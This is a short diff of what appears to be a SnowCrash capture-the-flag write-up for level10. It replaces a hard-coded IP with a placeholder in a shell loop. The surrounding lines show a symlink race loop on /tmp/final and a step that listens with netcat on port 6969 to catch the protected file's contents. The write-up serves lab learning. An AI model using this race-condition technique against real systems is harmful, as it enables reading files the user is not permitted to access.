@@ -83,7 +83,7 @@ while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/t
 
 - On a second ssh terminal let's execute level10 in a loop: 
 ```bash 
-while true; do (./level10 /tmp/final 10.11.200.134); done
+while true; do (./level10 /tmp/final [SnowCrash_VM_IP_address]); done
 ```
 
 - On a third terminal, we can listen to the port 6969 with the netcat command: 
